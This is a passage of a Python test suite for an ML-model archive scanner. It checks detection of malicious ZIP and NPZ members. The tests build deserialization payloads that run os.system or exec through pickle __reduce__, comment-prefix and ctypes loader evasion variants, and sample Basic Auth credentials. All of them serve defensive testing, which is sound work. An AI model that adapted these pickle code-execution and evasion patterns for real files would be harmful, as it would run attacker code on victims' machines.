        payload: bytes,
    ) -> None:
        archive_path = tmp_path / "invalid_legal_member.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr(member_name, payload)

        result = self.scanner.scan(str(archive_path))

        assert not any(
            check.name == "File Type Identification"
            and check.details.get("file_type") == "license"
            and check.details.get("zip_entry") == member_name
            for check in result.checks
        )

    def test_scan_zip_fails_closed_for_long_embedded_protocol0_license_member(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "long_embedded_license_member.zip"
        payload = (
            b"MIT License\nCopyright (c) Example\nPermission is hereby granted.\n"
            + b"cposix\nsystem\n(S'"
            + (b"id #" + b"A" * 70000)
            + b"'\ntR."
        )
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("LICENSE", payload)

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
        )

    def test_scan_npz_with_object_member_recurses_into_pickle(self, tmp_path: Path) -> None:
        import numpy as np

        class _ExecPayload:
            def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                return (exec, ("print('owned')",))

        archive_path = tmp_path / "payload.npz"
        np.savez(archive_path, safe=np.arange(3), payload=np.array([_ExecPayload()], dtype=object))

        result = self.scanner.scan(str(archive_path))
        assert result.success is False

        failed_checks = [c for c in result.checks if c.status.value == "failed"]
        assert any("cve-2019-6446" in (c.name + c.message).lower() for c in failed_checks)
        assert any(
            c.details.get("zip_entry") == "payload.npy" and c.location == f"{archive_path}:payload.npy"
            for c in failed_checks
        ), f"Expected rewritten check context for payload.npy, got: {[(c.location, c.details) for c in failed_checks]}"
        assert any("exec" in i.message.lower() and i.details.get("zip_entry") == "payload.npy" for i in result.issues)

    def test_scan_outer_zip_preserves_nested_npz_member_context(self, tmp_path: Path) -> None:
        import numpy as np

        class _ExecPayload:
            def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                return (exec, ("print('owned')",))

        inner_npz = tmp_path / "inner.npz"
        np.savez(
            inner_npz,
            payload_a=np.array([_ExecPayload()], dtype=object),
            payload_b=np.array([_ExecPayload()], dtype=object),
        )

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.write(inner_npz, arcname="inner.npz")

        result = self.scanner.scan(str(archive_path))
        failed_checks = [c for c in result.checks if c.status.value == "failed"]

        assert any(
            c.details.get("zip_entry") == "inner.npz:payload_a.npy"
            and c.location
            and f"{archive_path}:inner.npz:payload_a.npy" in c.location
            for c in failed_checks
        )
        assert any(
            c.details.get("zip_entry") == "inner.npz:payload_b.npy"
            and c.location
            and f"{archive_path}:inner.npz:payload_b.npy" in c.location
            for c in failed_checks
        )

    def test_scan_zip_with_plain_text_global_prefix_not_treated_as_pickle(self, tmp_path: Path) -> None:
        """Plain text entries that start with GLOBAL-like bytes should not trigger pickle parse warnings."""
        archive_path = tmp_path / "plain_text_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("notes.txt", b"c\nthis is plain text\nnot a pickle stream")

        result = self.scanner.scan(str(archive_path))
        assert result.success is True
        noisy_pickle_warnings = [
            issue for issue in result.issues if "incomplete or corrupted pickle file" in issue.message.lower()
        ]
        assert not noisy_pickle_warnings, (
            f"Expected no noisy pickle warning for plain text, got: {[i.message for i in noisy_pickle_warnings]}"
        )

    def test_scan_zip_audio_tokenizer_readme_basic_links_not_basic_auth_secret(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "model_card.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("audio_tokenizer/README.md", "Provide the basic links for the model\n")

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            from modelaudit.scanners.text_scanner import TextScanner

            return TextScanner(config={"check_network_comm": False, "cache_enabled": False}).scan(path)

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["audio_tokenizer/README.md"],
            }
        ).scan(str(archive_path))

        assert result.success is True
        assert not [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert any(
            check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.PASSED
            and check.details.get("zip_entry") == "audio_tokenizer/README.md"
            for check in result.checks
        )

    def test_scan_zip_text_member_detects_valid_basic_auth_header(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "headers.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("README.md", "Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n")

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            from modelaudit.scanners.text_scanner import TextScanner

            return TextScanner(config={"check_network_comm": False, "cache_enabled": False}).scan(path)

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["README.md"],
            }
        ).scan(str(archive_path))

        failed_secret_checks = [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert result.success is False
        assert failed_secret_checks
        assert failed_secret_checks[0].rule_code == "S702"
        assert failed_secret_checks[0].details.get("zip_entry") == "README.md"

    def test_scan_zip_backslash_readme_member_detects_basic_auth_header(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "backslash_headers.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            _writestr_preserving_member_name(
                archive,
                "docs\\README",
                "Authorization: Basic YmFja3NsYXNoOnBhc3M=\n",
            )

        result = core.scan_file(
            str(archive_path),
            config={
                "cache_scan_results": False,
                "check_network_comm": False,
            },
        )

        failed_secret_checks = [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert result.success is False
        assert failed_secret_checks
        assert failed_secret_checks[0].rule_code == "S702"
        zip_entry = failed_secret_checks[0].details.get("zip_entry")
        assert isinstance(zip_entry, str)
        assert zip_entry.replace("\\", "/") == "docs/README"

    def test_scan_zip_long_preserved_readme_member_cleans_tempdir(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "long_readme.zip"
        temp_root = tmp_path / "temp-root"
        temp_root.mkdir()
        monkeypatch.setattr(tempfile, "tempdir", str(temp_root))
        long_readme_name = "readme." + ("a" * 300) + ".md"

        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr(long_readme_name, "Authorization: Basic bG9uZy1yZWFkbWU6cGFzcw==\n")

        result = core.scan_file(
            str(archive_path),
            config={
                "cache_scan_results": False,
                "check_network_comm": False,
            },
        )

        failed_secret_checks = [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert result.success is False
        assert failed_secret_checks
        assert failed_secret_checks[0].rule_code == "S702"
        assert failed_secret_checks[0].details.get("zip_entry") == long_readme_name
        assert list(temp_root.iterdir()) == []

    def test_scan_nested_zip_text_member_detects_valid_basic_auth_header(self, tmp_path: Path) -> None:
        inner_payload = io.BytesIO()
        with zipfile.ZipFile(inner_payload, "w") as inner_archive:
            inner_archive.writestr("README.md", "Authorization: Basic dXNlcjpwYXNz\n")

        archive_path = tmp_path / "nested_headers.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested/inner.zip", inner_payload.getvalue())

        result = core.scan_file(
            str(archive_path),
            config={
                "cache_scan_results": False,
                "check_network_comm": False,
            },
        )

        failed_secret_checks = [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert result.success is False
        assert failed_secret_checks
        assert failed_secret_checks[0].rule_code == "S702"
        assert failed_secret_checks[0].details.get("zip_entry") == "nested/inner.zip:README.md"

    def test_scan_nested_zip_env_member_detects_basic_auth_server_header(self, tmp_path: Path) -> None:
        inner_payload = io.BytesIO()
        with zipfile.ZipFile(inner_payload, "w") as inner_archive:
            inner_archive.writestr(".env", "HTTP_AUTHORIZATION=Basic bmVzdGVkLWVudjpwYXNz\n")

        archive_path = tmp_path / "nested_env.zip"
        with zipfile.ZipFile(archive_path, "w") as outer_archive:
            outer_archive.writestr("nested/inner.zip", inner_payload.getvalue())

        result = core.scan_file(
            str(archive_path),
            config={
                "cache_scan_results": False,
                "check_network_comm": False,
            },
        )

        failed_secret_checks = [
            check
            for check in result.checks
            if check.name == "Embedded Secrets Detection"
            and check.status == CheckStatus.FAILED
            and check.details.get("secret_type") == "Basic Auth Credentials"
        ]
        assert result.success is False
        assert failed_secret_checks
        assert failed_secret_checks[0].rule_code == "S702"
        assert failed_secret_checks[0].details.get("zip_entry") == "nested/inner.zip:.env"

    def test_scan_zip_with_proto0_pickle_with_single_comment_token_bypass_regression(self, tmp_path: Path) -> None:
        """Single comment-token prefix must not suppress proto0 payload detection."""
        archive_path = tmp_path / "proto0_comment_prefixed_payload.zip"
        payload = b"#" + b'cos\nsystem\n(S"echo pwned"\ntR.'
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", payload)

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    def test_scan_nonexistent_file(self):
        """Test scanning a file that doesn't exist"""
        result = self.scanner.scan("/nonexistent/file.zip")
        assert result.success is False
        assert len(result.issues) > 0
        assert any("does not exist" in issue.message for issue in result.issues)

    def test_scan_invalid_zip(self):
        """Test scanning a file that's not a valid ZIP"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp.write(b"This is not a zip file")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is False
            assert len(result.issues) > 0
            assert any("not a valid zip" in issue.message.lower() for issue in result.issues)
        finally:
            os.unlink(tmp_path)

    def test_scan_empty_zip(self, tmp_path: Path) -> None:
        """An empty ZIP archive should scan successfully with no critical issues."""
        archive_path = tmp_path / "empty.zip"
        with zipfile.ZipFile(archive_path, "w"):
            pass  # empty archive

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        assert result.bytes_scanned == 0
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0

    def test_scan_zip_with_multiple_model_formats(self, tmp_path: Path) -> None:
        """ZIP containing multiple model-format files should scan all of them."""
        import pickle

        archive_path = tmp_path / "multi_format.zip"

        pkl_data = pickle.dumps({"weights": [1, 2, 3]})
        json_data = b'{"model_type": "linear", "version": "1.0"}'
        pt_data = pickle.dumps({"state_dict": {}})  # .pt files are pickle-based

        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("model.pkl", pkl_data)
            z.writestr("config.json", json_data)
            z.writestr("weights.pt", pt_data)

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        # All three file payloads should have been scanned
        assert result.bytes_scanned == len(pkl_data) + len(json_data) + len(pt_data)
        contents_paths = {c.get("path", "") for c in result.metadata.get("contents", [])}
        assert any("model.pkl" in p for p in contents_paths)
        assert any("config.json" in p for p in contents_paths)
        assert any("weights.pt" in p for p in contents_paths)

    def test_scan_zip_with_very_long_filename(self, tmp_path: Path) -> None:
        """ZIP entries with very long filenames should be handled without crashing."""
        import pickle

        archive_path = tmp_path / "long_name.zip"
        long_name = "a" * 200 + ".pkl"  # 204-character filename
        payload = pickle.dumps({"key": "value"})

        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr(long_name, payload)

        result = self.scanner.scan(str(archive_path))

        # Scan must not crash; success is expected for a benign payload
        assert result.success is True
        assert result.bytes_scanned == len(payload)

    def test_scan_truncated_zip(self, tmp_path: Path) -> None:
        """A truncated (corrupted) ZIP file should fail gracefully."""
        archive_path = tmp_path / "valid.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("file.txt", "some content")

        full_data = archive_path.read_bytes()
        truncated_path = tmp_path / "truncated.zip"
        truncated_path.write_bytes(full_data[: len(full_data) // 2])

        result = self.scanner.scan(str(truncated_path))

        # A truncated archive is invalid — scan must not raise an unhandled exception
        assert result.success is False
        assert len(result.issues) > 0


def _scan_python_member_checks(tmp_path: Path, source: str) -> dict[str | None, Any]:
    """Scan ``source`` as a Python archive member; return failed checks by rule code."""
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)
    result = ZipScanner().scan(str(archive_path))
    return {
        check.rule_code: check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    }


def test_scan_zip_pr1402_resolves_subclass_initializer_bypasses(tmp_path: Path) -> None:
    # A ctypes.CDLL subclass that preserves the native-loading initializer must be
    # flagged regardless of how construction is spelled (PR #1402 follow-up gaps).
    source = (
        "import ctypes\n"
        "class NewInTry(ctypes.CDLL):\n"
        "    def __new__(cls, name):\n"
        "        try:\n"
        "            return super().__new__(cls)\n"
        "        except Exception:\n"
        "            raise\n"
        "ctypes.LibraryLoader(NewInTry).newintry\n"
        "class SuperForward(ctypes.CDLL):\n"
        "    def __init__(self, *a):\n"
        "        super().__init__(*a)\n"
        "ctypes.LibraryLoader(SuperForward).superforwardlib\n"
        "class DirectForward(ctypes.CDLL):\n"
        "    def __init__(self, *a):\n"
        "        ctypes.CDLL.__init__(self, *a)\n"
        "ctypes.LibraryLoader(DirectForward).directforwardlib\n"
    )
    checks = _scan_python_member_checks(tmp_path, source)
    assert set(checks) == {"S110"}
    reason = checks["S110"].details["reason"]
    for member in ("newintry", "superforwardlib", "directforwardlib"):
        assert f"ctypes.LibraryLoader.{member}" in reason


def test_scan_zip_pr1402_resolves_indirect_loader_bindings(tmp_path: Path) -> None:
    source = (
        "import ctypes\n"
        "flag = True\n"
        "ternary = ctypes.cdll if flag else None\n"
        "ternary.ternarylib\n"
        "boolean = ctypes.cdll or None\n"
        "boolean.booleanlib\n"
        "(walrus := ctypes.CDLL)('walruslib')\n"
        "for looped in [ctypes.cdll]:\n"
        "    looped.loopedlib\n"
    )
    checks = _scan_python_member_checks(tmp_path, source)
    assert set(checks) == {"S110"}
    reason = checks["S110"].details["reason"]
    for member in ("ternarylib", "booleanlib", "loopedlib"):
        assert f"ctypes.cdll.{member}" in reason
    assert "ctypes.CDLL" in reason


def test_scan_zip_pr1402_honors_benign_setattr_overwrite_edges(tmp_path: Path) -> None:
    # A safe overwrite spelled with a trailing empty ``**{}`` or a starred tuple is
    # equivalent to a plain ``setattr`` and must not produce a critical finding.
    benign = (
        "import ctypes\n"
        "setattr(ctypes.windll, 'safe_member', len, **{})\n"
        "ctypes.windll.safe_member\n"
        "setattr(*(ctypes.windll, 'starred_member', len))\n"
        "ctypes.windll.starred_member\n"
    )
    assert _scan_python_member_checks(tmp_path, benign) == {}

    # A genuine native load inside the same shape still flags (no silent disable).
    loading = "import ctypes\nctypes.windll.kernel32\n"
    assert set(_scan_python_member_checks(tmp_path, loading)) == {"S110"}


def test_scan_zip_pr1402_fails_closed_on_deeply_nested_member(tmp_path: Path) -> None:
    # A crafted deeply-nested member must not crash the scan with RecursionError;
    # analysis fails closed (marked incomplete) instead.
    source = "import ctypes\nctypes.cdll" + ".a" * 6000 + "\n"
    archive_path = tmp_path / "deep.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(check.details.get("analysis_incomplete") for check in result.checks)
